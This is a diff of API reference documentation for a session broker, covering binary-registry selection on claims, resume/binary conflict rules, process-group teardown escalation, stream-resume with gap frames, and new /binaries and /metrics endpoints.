 The secret is never logged, never returned by `GET /leases`, and never passed in
 argv.
@@ -3108,15 +4838,78 @@ request is a small JSON envelope; `session_id` is optional.
 // request body
 {
   "config": "engine:\n  name: example\n",  // required: full nexus config (YAML text)
-  "session_id": "prior-session-id"          // optional: resume a persisted session
+  "session_id": "prior-session-id",         // optional: resume a persisted session
+  "binary": "vision"                        // optional: which `binaries:` entry to spawn
 }
 ```
+
+`binary` names an entry of the broker's [binary registry](#binary-registry-binaries).
+**Omitted means the reserved `nexus` entry**, which every load guarantees exists —
+so the field is additive and a client written before the registry existed keeps
+getting exactly what it got before. Leading/trailing whitespace is trimmed, the
+same way entry names are trimmed at load, so the two always agree. There is no
+operator-settable default: an operator must not be able to silently change what
+an existing client ends up spawning. (On a **resume**, omitted instead means the
+entry that created the session — see
+[Resume inherits the recorded binary](#resume-inherits-the-recorded-binary).)
+
+An **unknown** name is **HTTP 400**, with a message echoing the rejected name and
+listing the registry's actual entries — not a silent fallback to `nexus`, which
+would produce a session that merely behaves oddly. The name is resolved **before
+anything is allocated**, so a rejected claim consumes no lease, no capacity slot
+(it never even joins the FIFO wait queue), no temp config file, and spawns no
+process.
+
+The selected entry's `args` are appended after the broker's own `-config` /
+`-recall` arguments, and its `env` is layered under the broker-owned
+`NEXUS_BROKER_*` variables — see [Binary registry](#binary-registry-binaries).
+The spawned instance does **not** inherit the broker's environment wholesale: it
+carries the always-pass set, whatever [`inherit_env`](#instance-environment-inherit_env)
+declares, the entry's `env`, and the `NEXUS_BROKER_*` trio, and nothing else.
 
 When `session_id` is set the broker spawns the instance with `-recall <id>` so
 the engine reloads that session and replays its history; when omitted it starts
 a fresh session. An unknown/invalid `session_id` makes the engine fail to boot,
 so the instance never signals ready and the claim returns `502` ("instance
 exited before signalling ready") rather than silently starting a new session.
+
+#### Resume inherits the recorded binary
+
+On a resume, `binary` is reconciled against the entry recorded for that session
+in the [session → binary index](#session--binary-index-session-binariesjsonl).
+A session directory is engine state written by one particular build, and
+replaying it under a different variant does **not** fail loudly — the engine
+boots, the transcript loads, and the session simply behaves as though
+capabilities it once had have vanished. The claim is the only point at which that
+mistake is still attributable, so:
+
+| `session_id` | `binary` | Recorded binding | Outcome |
+|---|---|---|---|
+| set | omitted | `vision` | **Spawns `vision`** — the recorded entry is inherited, *not* the reserved `nexus`. |
+| set | `vision` | `vision` | Proceeds normally. |
+| set | `nexus` | `vision` | **`409`** — `{"error":"session \"…\" was created by binary \"vision\" but this claim requests \"nexus\"; …"}`. The message names **both** the recorded and the requested entry. |
+| set | anything | *(none)* | **Falls through**: spawns the requested entry, or `nexus` when none was requested. **No error.** |
+| set | omitted | `nocturne`, no longer in `binaries:` | **`409`** — the message names the missing entry so it can be restored. Deliberately *not* a silent fallback to `nexus`, which is the same foreign-build replay the mismatch row prevents. |
+| omitted | anything | — | Not a resume; resolves as described above. |
+
+An **unknown** requested name is still `400` (not `409`) even on a bound session:
+a misspelling is a client bug, and only the `400` lists the entries that exist.
+
+The check runs **before anything is allocated**, on the same path as the unknown-name
+`400`, so a refused resume consumes no lease, no capacity slot, no temp config
+file, and spawns no process.
+
+`409` rather than `400` or `500` for both conflict rows: the request is
+well-formed and the caller named a real session, so a `400` would blame it for a
+value it never sent; and nothing failed, so a `500` would report a healthy broker
+as broken. What conflicts is the session's recorded state against this broker's
+current configuration.
+
+The binding is **best-effort by construction** and this check inherits that: an
+unknown binding is *no opinion, proceed*. A broker with no `state_dir`, a session
+created before bindings were recorded, and a binding evicted by the index's
+4096-entry cap all resume exactly as they did before the check existed — none of
+them is ever reported as a mismatch.
 
 ```jsonc
 // success response (200)
@@ -3172,6 +4965,12 @@ logs one `WARN` at startup naming the consequence: `ws_url`s will be derived fro
 each request's `Host` header. The broker still starts — this shape is correct for
 a directly-reachable broker.
 
+A `wss://` or `https://` `advertise_addr` likewise logs one `WARN` at startup: the
+broker has no TLS listener, so it is advertising a scheme it does not serve. The
+broker still starts, because that is exactly right behind a TLS-terminating proxy
+and the process cannot tell whether one is there. Advertise `ws://` (or a bare
+`host:port`) on a broker nothing fronts.
+
 This resolution is **client-facing only**. The `/instance` dial-back address
 handed to a spawned instance is resolved separately and always collapses a
 wildcard bind to `127.0.0.1`, because instances are same-host by design;
@@ -3183,8 +4982,24 @@ wildcard bind to `127.0.0.1`, because instances are same-host by design;
 sends a `shutdown` frame to the instance, whose `nexus.io.broker` plugin emits
 `io.session.end` so the engine performs a clean `Stop` — flushing and
 persisting the session before exit. The broker then waits up to `release_grace`
-for the process to exit and **force-kills it** if that window elapses (no
-orphan). The lease is removed and its slot freed. The session directory under
+for the process to exit, and if that window elapses it **escalates**:
+
+1. `SIGTERM` to the instance's process group. The engine treats `SIGTERM` as a
+   clean shutdown, so this is a second graceful chance rather than a kill — and,
+   unlike the `shutdown` frame, it needs nothing from the dial-back socket. An
+   instance that is wedged or mid reconnect-backoff never receives the frame at
+   all, and this is the only teardown request it gets.
+2. `SIGKILL` to the same process group, **2s** later, if the process is still
+   there. That window is a fixed constant, not a config key: `release_grace` is
+   the operator's shutdown budget and has already elapsed by this point.
+
+Both signals go to the **process group**, not the instance process alone, so
+everything the instance started — shell-tool commands, MCP stdio servers, code
+interpreters — dies with it instead of being re-parented to init. Each instance
+is made the leader of its own process group at spawn time for exactly this
+reason.
+
+The lease is removed and its slot freed. The session directory under
 `~/.nexus/sessions/<id>/` is left intact and remains resumable via `-recall`.
 
 | Outcome                                  | Status | Body                                      |
@@ -3301,9 +5116,63 @@ was before authentication existed. A client built for an authenticated broker ca
 point a `?ticket=` at an open one and it still connects, rather than being refused
 by a store that never issued anything.
 
-After the upgrade, only inbound `io` frames (client → instance) reset the
-`idle_timeout` timer, and a frame whose `lease_id` does not match the socket's
-lease is dropped.
+After the upgrade, inbound `io` frames (client → instance) reset the
+`idle_timeout` timer — as does the instance reporting its turn finished, and a
+turn in flight suspends the timer entirely (see
+[`idle_timeout`](#session-broker-nexus-broker)) — and a frame whose `lease_id`
+does not match the socket's lease is dropped.
+
+#### `?from_seq=<n>` — resuming a dropped stream
+
+A **second** query parameter, orthogonal to the credential: `?from_seq=<n>` states
+the highest [`seq`](#session-broker-nexus-broker) the client received before its
+socket dropped. The broker replays every frame it still retains **after** `n`,
+oldest first, and only then continues with the live stream — replayed frames
+always precede live ones. It is a query parameter for the same reason `?ticket=`
+is (a browser cannot set headers on a WebSocket upgrade, and there is no
+client → broker control frame to carry it in), and the two **compose in any
+order**.
+
+`?from_seq=` is **not a credential.** Ticket precedence, ownership and every
+refusal above are unchanged by its presence: it can never widen what a caller may
+connect to, only what an already-admitted caller is handed first.
+
+| Value | Behaviour |
+|-------|-----------|
+| Absent | The live stream only — byte for byte what every connect did before resumption existed. |
+| `0` | Replay **everything** the buffer still holds. Not the same as absent: it is a client saying it has seen nothing. |
+| `n` > 0 | Replay the retained frames with `seq > n`. |
+| `n` greater than the lease's last `seq` | Reported as a `restarted` gap (see below) and the whole retained buffer is replayed — the client's numbering came from a stream that no longer exists. |
+| Malformed (not a number, negative, out of range) | Treated as **absent**, never refused. A resume is an optimisation on top of a connection that works without it, so a client bug in building the URL costs the replay, not the session. |
+
+The replay is **not** bounded by the connection's 256-frame send queue — it is
+written ahead of it — so the full [`client_replay_buffer_bytes`](#session-broker-nexus-broker)
+worth of frames replays intact however many frames that is.
+
+**When the buffer cannot cover the resume point**, the socket opens with a
+`stream-gap` frame *before* anything else, naming the range that is gone:
+
+```json
+{"version":1,"lease_id":"…","signal":"stream-gap",
+ "payload":{"reason":"evicted","requested_from_seq":41,"missing_from_seq":42,"missing_through_seq":118}}
+```
+
+| Field | Meaning |
+|-------|---------|
+| `reason` | `evicted` — the frames aged out of the bounded buffer. `restarted` — `requested_from_seq` is ahead of this lease's stream, which is what a lease restored across a broker restart looks like (the buffer is in-memory, so a restored lease renumbers from 1). |
+| `requested_from_seq` | Echoes the `from_seq` presented, so a client with several sockets in flight can tell which request it answers. |
+| `missing_from_seq`, `missing_through_seq` | **Inclusive** bounds of the frames the broker can no longer supply. Both are **omitted** when nothing is nameable — a `restarted` stream has no missing range under the new numbering. |
+
+The gap frame carries **no `seq`**: it describes one connection, not the lease's
+frame stream, so numbering it would make the stream's sequence depend on how often
+a client dropped. A gap is a **normal outcome a client must handle**, not an
+error — it is what any disconnection longer than the buffer produces. Adding the
+`stream-gap` signal needed no `brokerframe` version bump for the same reason `seq`
+did not: it is only ever sent to a client that opted in by presenting `?from_seq=`.
+
+The reconnect recipe end to end — mint a fresh ticket, send `from_seq`, handle the
+gap — is in the
+[session broker guide](../guides/session-broker.md#reconnecting-and-resuming-a-stream).
 
 ### `GET /leases` (HTTP API, not YAML)
 
@@ -3326,12 +5195,14 @@ capacity and queue aggregates. It performs no mutation.
   "max_concurrent": 8,     // configured cap (0 = unlimited)
   "slots_in_use": 2,       // live instances currently holding a slot
   "queue_depth": 0,        // claims parked in the FIFO capacity wait queue
+  "max_queue_depth": 32,   // configured ceiling on that queue (0 = unlimited)
   "leases": [
     {
       "lease_id": "…",
       "session_id": "…",                       // omitted until reported by the instance
       "pid": 41234,
       "state": "active",                        // "spawning" | "active" | "draining"
+      "binary": "vision",                       // registry entry NAME; "" = not recorded
       "reason": "manual release",               // teardown reason once draining; omitted otherwise
       "last_activity": "2026-06-25T12:00:00Z",  // RFC3339
       "created_at": "2026-06-25T11:59:30Z"      // RFC3339
@@ -3352,6 +5223,7 @@ caller's own leases and **no aggregate keys at all**:
       "session_id": "…",
       "pid": 41234,
       "state": "active",
+      "binary": "vision",
       "last_activity": "2026-06-25T12:00:00Z",
       "created_at": "2026-06-25T11:59:30Z"
     }
@@ -3359,11 +5231,26 @@ caller's own leases and **no aggregate keys at all**:
 }
 ```
 
-The aggregates are **absent, not zeroed**: `max_concurrent`, `slots_in_use` and
-`queue_depth` let one tenant infer another's load, and a zero would read as a
-factual claim about an idle broker to a client that does not know it is
-unprivileged. Clients must therefore treat a missing key as "not disclosed"
-rather than as `0`.
+The aggregates are **absent, not zeroed**: `max_concurrent`, `slots_in_use`,
+`queue_depth` and `max_queue_depth` let one tenant infer another's load, and a
+zero would read as a factual claim about an idle broker to a client that does not
+know it is unprivileged. Clients must therefore treat a missing key as "not
+disclosed" rather than as `0`.
+
+`max_queue_depth` is reported **beside** `queue_depth` because the observed depth
+is unreadable without its bound: a depth of 12 is either a busy broker or one
+about to start refusing claims with `capacity queue full`, and only the ceiling
+tells them apart. It follows `max_concurrent`'s convention — `0` means unlimited.
+
+`binary` is the [binary registry](#binary-registry-binaries) entry **name** this
+lease's instance was spawned from — a name, never a path, so it discloses nothing
+[`GET /binaries`](#get-binaries-http-api-not-yaml) does not already list. It
+appears in **both** response shapes. It is always present, and an **empty string
+means "not recorded"** — a lease restored from a lease journal written before the
+field existed, for instance. It never means "the entry named empty string", which
+cannot exist. Unlike `session_id` and `reason` it is *not* omitted when empty,
+precisely so a client can tell "not recorded" from "this broker is too old to
+report it".
 
 A caller that owns no live lease gets `200` with `{"leases": []}` — never a `404`
 and never an error. Filtering happens inside the registry snapshot, under the same
@@ -3372,6 +5259,142 @@ copied out at all.
 
 Surface states: `spawning` (lease exists, instance not yet registered),
 `active` (registered, frames can flow), `draining` (a teardown has latched).
+
+### `GET /binaries` (HTTP API, not YAML)
+
+`GET /binaries` lists the entries of the [binary registry](#binary-registry-binaries)
+this broker can spawn, so a client can render a picker from live broker truth
+instead of hardcoding names that may not exist on the broker it is talking to.
+It performs no mutation and reads nothing from the request.
+
+```jsonc
+// response (200) — entries sorted by name
+{
+  "binaries": [
+    { "name": "archive", "label": "Nexus 0.9" },
+    { "name": "nexus" },
+    {
+      "name": "vision",
+      "label": "Nexus (vision)",
+      "description": "Multimodal build with the image tools compiled in"
+    }
+  ]
+}
+```
+
+| Field                     | Type             | Description |
+|---------------------------|------------------|-------------|
+| `binaries`                | list of object   | The listing. Always present and never `null` — an empty registry would encode as `[]` — so a client can iterate it unconditionally. |
+| `binaries[].name`         | string           | The registry key — the exact string to put in a claim's `binary` field. Always present. |
+| `binaries[].label`        | string           | The entry's `label`. **Omitted** when the operator set none. |
+| `binaries[].description`  | string           | The entry's `description`. **Omitted** when the operator set none. |
+
+**The response is an object, not a bare array.** The envelope exists so a
+broker-wide fact — a default-binary hint, a schema version — can be added later as
+a sibling key, which a client that ignores unknown keys will not notice. A
+top-level array has nowhere to put one, so adding it would mean changing the
+top-level JSON type and breaking every client at once.
+
+**`path`, `args` and `env` are never serialized**, nor is the derived absolute
+path the broker resolved at boot. They are broker-host detail — build locations,
+deployment flags, per-variant environment — that a claiming client has no use for
+and every reason not to learn. Only the three fields above cross the wire.
+
+`label` and `description` are **absent, not empty**, when unset, so a client can
+tell "the operator wrote nothing" from "the operator wrote an empty string". A
+consumer with no label falls back to `name`, which is always present.
+
+Ordering is by `name`, ascending — stable across requests and identical for every
+caller, so a picker does not reshuffle. The *contents* are not stable over time:
+`binaries:` is [reloadable](#reloadable-keys-sighup), so an operator's edit
+changes the listing on the next `SIGHUP` (or the next boot). The listing and the
+configuration it was rendered from are published in one atomic swap, so a caller
+never sees a half-applied registry. The reserved `nexus` entry is always
+included: it is spawnable from every broker no matter what the config says.
+
+The listing is **unfiltered** — every caller sees every entry. There is no
+per-principal visibility rule: an entry name is not a secret (an unknown one is
+already rejected by `POST /claim` with a **400** naming the alternatives), and a
+filter would need a per-entry authorization model no config key describes.
+
+Authentication follows `POST /claim` exactly: the route is registered behind the
+same middleware, so with an `auth:` block a missing or invalid credential is
+refused (**401**) and a valid one gets the list; with no `auth:` block the route
+serves an unauthenticated caller, which is a supported deployment rather than a
+degraded one.
+
+### `GET /metrics` (HTTP API, not YAML)
+
+`GET /metrics` is the broker's Prometheus scrape surface. It is read-only,
+mutates nothing, and takes no parameters. The response is the Prometheus **text
+exposition format** with `Content-Type: text/plain; version=0.0.4; charset=utf-8`.
+
+The exposition is hand-rolled: the broker is stdlib plus `github.com/coder/websocket`,
+and no client library is pulled in for it. There is **no configuration key** — the
+route is always mounted.
+
+**Authorization is stricter than every other route.** It sits behind the same
+`auth:` middleware as `POST /claim`, *and* additionally requires
+`auth.admin_scope`:
+
+| Broker configuration                          | Caller                              | Result |
+|-----------------------------------------------|-------------------------------------|--------|
+| No `auth:` block                              | anyone                              | `200` + exposition |
+| `auth:` configured                            | no / invalid credential             | `401` (from the guard) |
+| `auth:` configured                            | valid credential, no `admin_scope`  | `403` `{"error":"insufficient scope"}` |
+| `auth:` configured                            | valid credential **with** `admin_scope` | `200` + exposition |
+| `auth:` configured, `admin_scope` set to `""` | anyone                              | `403` — nobody is an operator |
+
+The rule matches [`GET /leases`](#get-leases-http-api-not-yaml): every number here
+is a **whole-registry aggregate**, which is exactly the disclosure the leases
+listing already reserves for an operator. With no `auth:` block it serves anyone,
+exactly as every other route on this binary does.
+
+**Metric names are a stable surface.** All are namespaced `nexus_broker_`, and
+their cardinality is bounded by construction — no metric is ever labelled by lease
+id, principal, session id or binary path, and every label value comes from a
+compile-time set, so each declared series is present (at `0`) from the very first
+scrape and an alert can be written against it before it ever fires.
+
+| Metric | Type | Labels | Meaning |
+|---|---|---|---|
+| `nexus_broker_claims_total`           | counter   | `outcome` | Instance claims handled by the shared spawn spine — `POST /claim` **and** the A2A ingress — by outcome. |
+| `nexus_broker_claim_duration_seconds` | histogram | —         | Wall time of an **accepted** claim, request to ready instance. A refusal is not observed here. |
+| `nexus_broker_spawn_failures_total`   | counter   | `reason`  | Spawns that produced no ready instance. |
+| `nexus_broker_frames_dropped_total`   | counter   | `reason`  | Broker frames discarded rather than relayed. |
+| `nexus_broker_replay_gaps_total`      | counter   | `reason`  | Stream-gap notices served to a resuming client. |
+| `nexus_broker_client_evictions_total` | counter   | —         | Client WebSockets displaced by a newer connection on the same lease. |
+| `nexus_broker_config_reloads_total`   | counter   | `outcome` | SIGHUP reloads, `applied` or `rejected`. |
+| `nexus_broker_restored_leases_total`  | counter   | `outcome` | Leases adopted from the journal at boot, and what became of them. |
+| `nexus_broker_slots_in_use`           | gauge     | —         | Capacity slots currently held: one per live lease. |
+| `nexus_broker_max_concurrent`         | gauge     | —         | Configured `max_concurrent`. `0` = unlimited. |
+| `nexus_broker_queue_depth`            | gauge     | —         | Claims parked in the FIFO capacity queue. |
+| `nexus_broker_max_queue_depth`        | gauge     | —         | Configured `max_queue_depth`. `0` = unlimited. |
+| `nexus_broker_leases`                 | gauge     | `state`   | Live leases by the `GET /leases` surface state: `spawning`, `active`, `draining`. |
+| `nexus_broker_tickets_outstanding`    | gauge     | —         | Issued, unredeemed WebSocket tickets still held. |
+
+Label values:
+
+| Label | Metric | Values |
+|---|---|---|
+| `outcome` | `nexus_broker_claims_total` | `accepted`, `rejected`, `no_capacity`, `queue_timeout`, `queue_full`, `principal_lease_limit`, `principal_queue_limit`, `cancelled`, `spawn_failed`, `ready_timeout`, `internal` |
+| `reason`  | `nexus_broker_spawn_failures_total` | `exec`, `exited_before_ready`, `ready_timeout` |
+| `reason`  | `nexus_broker_frames_dropped_total` | `undecodable`, `lease_mismatch`, `no_instance`, `instance_buffer_full`, `client_buffer_full`, `lease_gone` |
+| `reason`  | `nexus_broker_replay_gaps_total` | `evicted`, `restarted` |
+| `outcome` | `nexus_broker_config_reloads_total` | `applied`, `rejected` |
+| `outcome` | `nexus_broker_restored_leases_total` | `restored`, `reattached`, `reaped` |
+| `state`   | `nexus_broker_leases` | `spawning`, `active`, `draining` |
+
+The three capacity refusals — `no_capacity`, `queue_timeout`, `queue_full` — all
+answer HTTP `503`, and they are separate label values precisely because they call
+for three different fixes (raise `max_concurrent`, raise `queue_wait_timeout`,
+raise `max_queue_depth`). Grouping a dashboard by status code loses that.
+
+The counters are **process-lifetime and monotonic**; they reset on restart, as
+Prometheus counters are expected to. The gauges are read from live state at scrape
+time — from the same `slots_in_use` / waiter-queue counters the capacity
+accounting and `GET /leases` already use — so they cannot drift from what the
+registry actually holds.
 
 Full narrative, the new-vs-resume flow, a WebSocket connect sketch, and the v1
 deployment caveats live in the
